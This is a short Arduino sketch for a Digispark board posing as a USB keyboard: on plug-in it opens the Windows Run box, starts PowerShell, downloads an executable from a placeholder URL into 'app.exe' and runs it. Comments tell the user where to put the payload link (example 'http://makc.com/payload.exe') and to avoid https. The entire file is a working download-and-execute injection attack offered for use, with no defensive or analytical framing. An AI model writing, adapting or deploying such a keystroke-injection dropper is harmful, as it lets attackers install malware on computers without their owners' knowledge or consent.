#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_RIGHT);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400); // powershell starts too long
  
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.println("$client.DownloadFile(\"LINK\",\"app.exe\")"); // Instead of LINK, write here link with HTTP to payload. Example: http://makc.com/payload.exe
  /* Notes:
   *  Don't use https
   *  Don't delete \"
   *  If you want change save filename ("app.exe"), change it not only above but also below
   */
  
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.println(".\\app.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
